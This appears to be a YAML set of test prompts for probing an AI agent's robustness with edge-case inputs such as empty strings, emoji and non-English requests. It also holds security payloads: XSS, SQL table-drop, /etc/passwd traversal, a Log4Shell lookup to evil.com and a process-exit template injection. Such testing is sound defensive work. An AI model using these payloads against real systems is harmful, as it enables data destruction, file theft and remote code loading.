agent_type: any
templates:
  - prompt: ""
    type: edge_case
    difficulty: hard
    category: empty_input
  - prompt: ""
    type: edge_case
    difficulty: hard
    category: long_input
  - prompt: "🔥🔥🔥🔥🔥"
    type: edge_case
    difficulty: easy
    category: unicode
  - prompt: "null"
    type: edge_case
    difficulty: easy
    category: "null_input"
  - prompt: "undefined"
    type: edge_case
    difficulty: easy
    category: undefined_input
  - prompt: "<script>alert('xss')</script>"
    type: security
    difficulty: medium
    category: xss
  - prompt: "'; DROP TABLE users; --"
    type: security
    difficulty: medium
    category: sql_injection
  - prompt: "../../../../etc/passwd"
    type: security
    difficulty: medium
    category: path_traversal
  - prompt: "${jndi:ldap://evil.com/a}"
    type: security
    difficulty: medium
    category: log4shell
  - prompt: "{{constructor.constructor('return this.process')().exit()}}"
    type: security
    difficulty: medium
    category: prototype_pollution
  - prompt: "Help"
    type: edge_case
    difficulty: easy
    category: minimal_input
  - prompt: "I need help with my order but I don't know my order number or the email I used or my name or anything"
    type: edge_case
    difficulty: hard
    category: insufficient_info
  - prompt: "你好，我需要帮助处理我的订单。我不会说英语。"
    type: edge_case
    difficulty: medium
    category: non_english
  - prompt: "Je voudrais un remboursement pour ma commande svp"
    type: edge_case
    difficulty: medium
    category: non_english
  - prompt: "Hola, ¿puedes ayudarme con mi cuenta?"
    type: edge_case
    difficulty: medium
    category: non_english
  - prompt: "Ich möchte mein Konto löschen und alle meine Daten gemäß DSGVO löschen lassen."
    type: edge_case
    difficulty: medium
    category: non_english
